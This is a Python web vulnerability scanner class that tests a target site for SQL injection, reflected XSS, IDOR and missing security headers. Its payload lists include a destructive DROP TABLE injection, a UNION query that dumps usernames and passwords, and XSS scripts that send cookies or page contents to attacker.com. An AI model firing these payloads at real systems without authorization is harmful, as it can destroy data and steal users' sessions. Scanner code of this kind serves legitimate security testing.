import requests
import re
import urllib.parse
from bs4 import BeautifulSoup
import time
from urllib.robotparser import RobotFileParser
from vulnerability_db import VulnerabilityDatabase

class VulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Educational-Vulnerability-Scanner/1.0'
        })
        self.vulnerabilities = []
        self.security_headers = []
        self.forms = []
        self.links = []
        self.vuln_db = VulnerabilityDatabase()
        
    def check_target_accessibility(self):
        """Check if the target URL is accessible"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            if response.status_code == 200:
                return True
            return False
        except Exception as e:
            return False
    
    def discover_forms(self):
        """Discover forms on the target website"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_data['inputs'].append(input_data)
                
                self.forms.append(form_data)
                
        except Exception as e:
            pass
    
    def discover_links(self, max_pages=3):
        """Discover internal links for IDOR testing"""
        try:
            visited = set()
            to_visit = [self.target_url]
            
            while to_visit and len(visited) < max_pages:
                url = to_visit.pop(0)
                if url in visited:
                    continue
                    
                visited.add(url)
                
                try:
                    response = self.session.get(url, timeout=10)
                    soup = BeautifulSoup(response.content, 'html.parser')
                    
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        if href.startswith('/'):
                            full_url = self.target_url + href
                        elif href.startswith('http') and self.target_url in href:
                            full_url = href
                        else:
                            continue
                            
                        if full_url not in visited and len(visited) < max_pages:
                            to_visit.append(full_url)
                            self.links.append(full_url)
                            
                except Exception:
                    continue
                    
        except Exception as e:
            pass
    
    def scan_sql_injection(self, aggressive=False):
        """Scan for SQL injection vulnerabilities"""
        self.discover_forms()
        
        # SQL injection payloads
        basic_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin'--",
            "admin'#",
            "' UNION SELECT NULL--"
        ]
        
        advanced_payloads = [
            "' UNION SELECT 1,2,3,4,5--",
            "' AND (SELECT COUNT(*) FROM sysobjects) > 0--",
            "' OR SLEEP(5)--",
            "'; DROP TABLE users; --",
            "' OR '1'='1' UNION SELECT username, password FROM users--"
        ]
        
        payloads = basic_payloads + (advanced_payloads if aggressive else [])
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(self.target_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param_name in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?" + urllib.parse.urlencode(test_params, doseq=True)
                    
                    if self._test_sql_injection(test_url, payload, f"URL parameter: {param_name}"):
                        break
        
        # Test forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'email', 'password', 'search']:
                    for payload in payloads:
                        if self._test_sql_injection_form(form, input_field['name'], payload):
                            break
    
    def _test_sql_injection(self, test_url, payload, location):
        """Test a specific URL for SQL injection"""
        try:
            # Get baseline response
            baseline = self.session.get(self.target_url, timeout=10)
            baseline_time = time.time()
            
            # Test with payload
            start_time = time.time()
            response = self.session.get(test_url, timeout=10)
            response_time = time.time() - start_time
            
            # Detection logic
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'warning: mysql',
                'postgresql query failed', 'warning: pg_',
                'oracle error', 'microsoft odbc', 'sqlite_',
                'warning: sqlite_', 'mysql server version',
                'postgresql.*error', 'valid mysql result'
            ]
            
            response_text = response.text.lower()
            
            # Check for SQL error messages
            for error_pattern in sql_errors:
                if re.search(error_pattern, response_text):
                    self._add_vulnerability(
                        'SQL Injection',
                        'High',
                        location,
                        f"SQL error message detected with payload: {payload}",
                        payload,
                        self.vuln_db.get_prevention('sql_injection')
                    )
                    return True
            
            # Check for time-based injection (SLEEP/WAITFOR)
            if 'sleep' in payload.lower() and response_time > 4:
                self._add_vulnerability(
                    'SQL Injection (Time-based)',
                    'High',
                    location,
                    f"Time delay detected, indicating potential time-based SQL injection",
                    payload,
                    self.vuln_db.get_prevention('sql_injection')
                )
                return True
                
            # Check for boolean-based differences
            if len(response.text) != len(baseline.text) or response.status_code != baseline.status_code:
                if "1=1" in payload or "OR" in payload:
                    self._add_vulnerability(
                        'SQL Injection (Boolean-based)',
                        'Medium',
                        location,
                        f"Response differences detected with boolean payload",
                        payload,
                        self.vuln_db.get_prevention('sql_injection')
                    )
                    return True
                    
        except Exception as e:
            pass
        
        return False
    
    def _test_sql_injection_form(self, form, field_name, payload):
        """Test form input for SQL injection"""
        try:
            form_action = form['action']
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = self.target_url + form_action
                else:
                    form_action = self.target_url + '/' + form_action
            
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == field_name:
                    form_data[input_field['name']] = payload
                else:
                    form_data[input_field['name']] = input_field.get('value', 'test')
            
            if form['method'] == 'POST':
                response = self.session.post(form_action, data=form_data, timeout=10)
            else:
                response = self.session.get(form_action, params=form_data, timeout=10)
            
            # Same detection logic as URL testing
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'warning: mysql',
                'postgresql query failed', 'warning: pg_',
                'oracle error', 'microsoft odbc', 'sqlite_'
            ]
            
            response_text = response.text.lower()
            for error_pattern in sql_errors:
                if re.search(error_pattern, response_text):
                    self._add_vulnerability(
                        'SQL Injection',
                        'High',
                        f"Form field: {field_name}",
                        f"SQL error message detected in form submission",
                        payload,
                        self.vuln_db.get_prevention('sql_injection')
                    )
                    return True
                    
        except Exception as e:
            pass
        
        return False
    
    def scan_xss(self, aggressive=False):
        """Scan for XSS vulnerabilities"""
        self.discover_forms()
        
        # XSS payloads
        basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        advanced_payloads = [
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<script>fetch('http://attacker.com/steal.php?data='+btoa(document.documentElement.outerHTML))</script>"
        ]
        
        payloads = basic_payloads + (advanced_payloads if aggressive else [])
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(self.target_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param_name in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?" + urllib.parse.urlencode(test_params, doseq=True)
                    
                    if self._test_xss(test_url, payload, f"URL parameter: {param_name}"):
                        break
        
        # Test forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'email', 'search', 'textarea']:
                    for payload in payloads:
                        if self._test_xss_form(form, input_field['name'], payload):
                            break
    
    def _test_xss(self, test_url, payload, location):
        """Test a specific URL for XSS"""
        try:
            response = self.session.get(test_url, timeout=10)
            
            # Check if payload is reflected in response
            if payload in response.text:
                # Additional checks for actual XSS
                if any(tag in payload.lower() for tag in ['<script', '<img', '<svg', '<iframe', 'javascript:']):
                    severity = 'High' if 'script' in payload.lower() else 'Medium'
                    
                    self._add_vulnerability(
                        'Cross-Site Scripting (XSS)',
                        severity,
                        location,
                        f"XSS payload reflected in response without proper encoding",
                        payload,
                        self.vuln_db.get_prevention('xss')
                    )
                    return True
                    
        except Exception as e:
            pass
        
        return False
    
    def _test_xss_form(self, form, field_name, payload):
        """Test form input for XSS"""
        try:
            form_action = form['action']
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = self.target_url + form_action
                else:
                    form_action = self.target_url + '/' + form_action
            
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == field_name:
                    form_data[input_field['name']] = payload
                else:
                    form_data[input_field['name']] = input_field.get('value', 'test')
            
            if form['method'] == 'POST':
                response = self.session.post(form_action, data=form_data, timeout=10)
            else:
                response = self.session.get(form_action, params=form_data, timeout=10)
            
            # Check if payload is reflected
            if payload in response.text:
                severity = 'High' if 'script' in payload.lower() else 'Medium'
                
                self._add_vulnerability(
                    'Cross-Site Scripting (XSS)',
                    severity,
                    f"Form field: {field_name}",
                    f"XSS payload reflected in form response",
                    payload,
                    self.vuln_db.get_prevention('xss')
                )
                return True
                
        except Exception as e:
            pass
        
        return False
    
    def scan_idor(self, max_pages=3):
        """Scan for Insecure Direct Object References"""
        self.discover_links(max_pages)
        
        # Common IDOR patterns
        idor_patterns = [
            r'/user/(\d+)',
            r'/profile/(\d+)',
            r'/document/(\d+)',
            r'/file/(\d+)',
            r'/order/(\d+)',
            r'/account/(\d+)',
            r'id=(\d+)',
            r'user_id=(\d+)',
            r'doc_id=(\d+)'
        ]
        
        for link in self.links:
            for pattern in idor_patterns:
                match = re.search(pattern, link)
                if match:
                    original_id = match.group(1)
                    
                    # Test with different IDs
                    test_ids = [
                        str(int(original_id) + 1),
                        str(int(original_id) - 1),
                        '999999',
                        '1'
                    ]
                    
                    for test_id in test_ids:
                        test_url = link.replace(original_id, test_id)
                        if self._test_idor(link, test_url, original_id, test_id):
                            break
    
    def _test_idor(self, original_url, test_url, original_id, test_id):
        """Test for IDOR vulnerability"""
        try:
            # Get original response
            original_response = self.session.get(original_url, timeout=10)
            
            # Get test response
            test_response = self.session.get(test_url, timeout=10)
            
            # Check if test response is accessible and different
            if (test_response.status_code == 200 and 
                original_response.status_code == 200 and
                len(test_response.text) > 100 and
                test_response.text != original_response.text):
                
                # Look for signs that different user data is being accessed
                indicators = [
                    'profile', 'account', 'user', 'personal',
                    'private', 'confidential', 'dashboard'
                ]
                
                test_content = test_response.text.lower()
                if any(indicator in test_content for indicator in indicators):
                    self._add_vulnerability(
                        'Insecure Direct Object Reference (IDOR)',
                        'High',
                        test_url,
                        f"Unauthorized access to object with ID {test_id} (original ID: {original_id})",
                        f"Original: {original_url}\nTest: {test_url}",
                        self.vuln_db.get_prevention('idor')
                    )
                    return True
                    
        except Exception as e:
            pass
        
        return False
    
    def check_security_headers(self):
        """Check for missing security headers"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            
            security_headers_check = [
                ('Content-Security-Policy', 'High'),
                ('X-Frame-Options', 'Medium'),
                ('X-XSS-Protection', 'Low'),
                ('X-Content-Type-Options', 'Medium'),
                ('Strict-Transport-Security', 'High'),
                ('Referrer-Policy', 'Low'),
                ('Permissions-Policy', 'Medium')
            ]
            
            for header_name, importance in security_headers_check:
                status = 'Present' if header_name in headers else 'Missing'
                value = headers.get(header_name, 'Not set')
                
                self.security_headers.append({
                    'Header': header_name,
                    'Status': status,
                    'Value': value,
                    'Importance': importance
                })
                
                if status == 'Missing' and importance in ['High', 'Medium']:
                    severity = 'Medium' if importance == 'High' else 'Low'
                    self._add_vulnerability(
                        'Missing Security Header',
                        severity,
                        'HTTP Response Headers',
                        f"Missing {header_name} header",
                        f"Header: {header_name}",
                        self.vuln_db.get_prevention('security_headers')
                    )
                    
        except Exception as e:
            pass
    
    def _add_vulnerability(self, vuln_type, severity, location, description, payload, prevention):
        """Add a vulnerability to the results"""
        vulnerability = {
            'type': vuln_type,
            'severity': severity,
            'location': location,
            'description': description,
            'payload': payload,
            'prevention': prevention,
            'references': self.vuln_db.get_references(vuln_type.lower().replace(' ', '_'))
        }
        self.vulnerabilities.append(vulnerability)
    
    def get_results(self):
        """Get scan results"""
        return {
            'target_url': self.target_url,
            'scan_timestamp': time.time(),
            'vulnerabilities': self.vulnerabilities,
            'security_headers': self.security_headers,
            'total_vulnerabilities': len(self.vulnerabilities),
            'high_severity': len([v for v in self.vulnerabilities if v['severity'] == 'High']),
            'medium_severity': len([v for v in self.vulnerabilities if v['severity'] == 'Medium']),
            'low_severity': len([v for v in self.vulnerabilities if v['severity'] == 'Low'])
        }
